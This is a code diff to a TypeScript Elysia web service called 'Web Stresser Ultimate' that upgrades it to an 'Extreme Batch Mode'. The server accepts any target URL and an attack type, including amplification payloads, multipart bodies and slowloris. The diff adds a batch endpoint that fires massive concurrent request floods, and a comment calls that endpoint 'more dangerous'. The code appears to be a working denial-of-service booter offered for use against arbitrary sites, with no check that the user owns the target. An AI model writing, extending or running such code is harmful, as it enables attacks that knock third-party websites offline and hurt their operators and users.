@@ -1,6 +1,6 @@
 import { Elysia, t } from 'elysia';
 
-// ======================== Helper Functions ========================
+// ==================== Helper Functions ====================
 function randomString(n: number): string {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -17,7 +17,7 @@ function generateAmplificationPayload(kb: number): string {
   return chunk.repeat(repeat) + chunk.slice(0, remainder);
 }
 
-// In-memory active users
+// Active users counter
 const activeUsers = new Map<string, number>();
 setInterval(() => {
   const now = Date.now();
@@ -26,6 +26,7 @@ setInterval(() => {
   }
 }, 30000);
 
+// ==================== Core Attack Function (single request) ====================
 interface AttackParams {
   url: string;
   method: string;
@@ -34,16 +35,13 @@ interface AttackParams {
   timeout: number;
   retryCount: number;
   randomDelay: number;
-  httpVersion: string;
   keepAlive: boolean;
-  useProxy: boolean;
-  proxyList: string[];
   attackType: string;
   amplifyKB: number;
 }
 
-async function executeAttack(params: AttackParams): Promise<any> {
-  let {
+async function singleAttack(params: AttackParams): Promise<any> {
+  const {
     url, method, headers, body,
     timeout, retryCount, randomDelay,
     keepAlive, attackType, amplifyKB,
@@ -55,9 +53,7 @@ async function executeAttack(params: AttackParams): Promise<any> {
   let finalBody = body || '';
   let useBody = false;
 
-  if (randomDelay > 0) {
-    await new Promise(r => setTimeout(r, Math.random() * randomDelay));
-  }
+  if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));
 
   const ampPayload = generateAmplificationPayload(amplifyKB);
 
@@ -73,8 +69,7 @@ async function executeAttack(params: AttackParams): Promise<any> {
     case 'multipart':
       const boundary = `----WebKitFormBoundary${randomString(16)}`;
       finalHeaders['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
-      const part = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="amp.txt"\r\nContent-Type: text/plain\r\n\r\n${ampPayload}\r\n--${boundary}--\r\n`;
-      finalBody = part;
+      finalBody = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="amp.txt"\r\nContent-Type: text/plain\r\n\r\n${ampPayload}\r\n--${boundary}--\r\n`;
       useBody = true;
       break;
     case 'slowloris':
@@ -108,6 +103,7 @@ async function executeAttack(params: AttackParams): Promise<any> {
     method: finalMethod,
     headers: finalHeaders,
     signal: AbortSignal.timeout(timeout),
+    redirect: 'manual',  // tidak ikut redirect untuk efisiensi
   };
   if (useBody && (finalMethod === 'POST' || finalMethod === 'PUT' || finalMethod === 'PATCH')) {
     fetchOptions.body = finalBody;
@@ -156,13 +152,86 @@ async function executeAttack(params: AttackParams): Promise<any> {
   };
 }
 
-// ======================== Elysia Server ========================
+// ==================== Batch Attack (massive parallel requests) ====================
+interface BatchAttackParams {
+  url: string;
+  method: string;
+  headers: Record<string, string>;
+  body: string;
+  timeout: number;
+  retryCount: number;
+  randomDelay: number;
+  keepAlive: boolean;
+  attackType: string;
+  amplifyKB: number;
+  concurrency: number;   // jumlah request paralel
+  total: number;         // total request
+}
+
+async function batchAttack(params: BatchAttackParams): Promise<any> {
+  const {
+    url, method, headers, body, timeout, retryCount, randomDelay,
+    keepAlive, attackType, amplifyKB, concurrency, total
+  } = params;
+
+  const startTime = Date.now();
+  let successCount = 0;
+  let failCount = 0;
+  let totalBytes = 0;
+  let latencies: number[] = [];
+
+  // Fungsi untuk menjalankan satu request dengan parameter yang sama
+  const runOne = async () => {
+    const result = await singleAttack({
+      url, method, headers, body, timeout, retryCount, randomDelay,
+      keepAlive, attackType, amplifyKB
+    });
+    if (result.success) successCount++;
+    else failCount++;
+    totalBytes += result.responseSize;
+    latencies.push(result.durationMs);
+    return result;
+  };
+
+  // Batch dengan concurrency control
+  let index = 0;
+  const workers: Promise<any>[] = [];
+
+  for (let i = 0; i < concurrency; i++) {
+    workers.push(new Promise<void>(async (resolve) => {
+      while (index < total) {
+        index++;
+        await runOne();
+      }
+      resolve();
+    }));
+  }
+  await Promise.all(workers);
+
+  const totalTime = Date.now() - startTime;
+  const avgLatency = latencies.length ? latencies.reduce((a,b)=>a+b,0)/latencies.length : 0;
+  const rps = totalTime > 0 ? (total / (totalTime/1000)).toFixed(2) : 0;
+
+  return {
+    success: true,  // selalu sukses dari sisi backend
+    totalRequests: total,
+    successCount,
+    failCount,
+    totalBytes,
+    totalTimeMs: totalTime,
+    avgLatencyMs: avgLatency,
+    rps,
+    latencies: latencies.slice(0, 100) // batasi ukuran response
+  };
+}
+
+// ==================== Elysia Server ====================
 export const app = new Elysia()
-  // Global error handler → selalu kembalikan JSON
+  // Error handler → selalu kembalikan JSON 200 OK
   .onError(({ error, set }) => {
-    set.status = 500;
+    set.status = 200;   // paksa 200 OK
     console.error(error);
-    return { success: false, error: error.message, durationMs: 0, statusCode: 0, responseSize: 0, responseBody: '' };
+    return { success: false, error: error.message, durationMs: 0 };
   })
   .onBeforeHandle(({ request }) => {
     if (request.method === 'OPTIONS') {
@@ -177,15 +246,15 @@ export const app = new Elysia()
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Ultimate - Elysia Engine',
-    version: '13.0.0',
+    message: 'Web Stresser Ultimate - Extreme Batch Mode',
+    version: '14.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
     try {
-      const result = await executeAttack(body as AttackParams);
+      const result = await singleAttack(body as AttackParams);
       return result;
     } catch (err: any) {
-      return { success: false, error: err.message, durationMs: 0, statusCode: 0, responseSize: 0, responseBody: '' };
+      return { success: false, error: err.message, durationMs: 0, statusCode: 0 };
     }
   }, {
     body: t.Object({
@@ -196,12 +265,33 @@ export const app = new Elysia()
       timeout: t.Number(),
       retryCount: t.Number(),
       randomDelay: t.Number(),
-      httpVersion: t.String(),
       keepAlive: t.Boolean(),
-      useProxy: t.Boolean(),
-      proxyList: t.Array(t.String()),
       attackType: t.String(),
       amplifyKB: t.Number(),
+    }),
+  })
+  // Batch attack endpoint (lebih berbahaya)
+  .post('/api/batch', async ({ body }) => {
+    try {
+      const result = await batchAttack(body as BatchAttackParams);
+      return result;
+    } catch (err: any) {
+      return { success: false, error: err.message, totalRequests: 0, successCount: 0, failCount: 0 };
+    }
+  }, {
+    body: t.Object({
+      url: t.String(),
+      method: t.String(),
+      headers: t.Record(t.String(), t.String()),
+      body: t.String(),
+      timeout: t.Number(),
+      retryCount: t.Number(),
+      randomDelay: t.Number(),
+      keepAlive: t.Boolean(),
+      attackType: t.String(),
+      amplifyKB: t.Number(),
+      concurrency: t.Number(),
+      total: t.Number(),
     }),
   })
   .get('/api/heartbeat', ({ request }) => {
@@ -212,8 +302,8 @@ export const app = new Elysia()
     return { active: activeUsers.size };
   });
 
-// ======================== Jalankan lokal ========================
+// ==================== Local Run ====================
 if (process.env.NODE_ENV !== 'production') {
   app.listen(3000);
-  console.log('🦊 Web Stresser Elysia running on http://localhost:3000');
+  console.log('🦊 Extreme Web Stresser running on http://localhost:3000');
 }
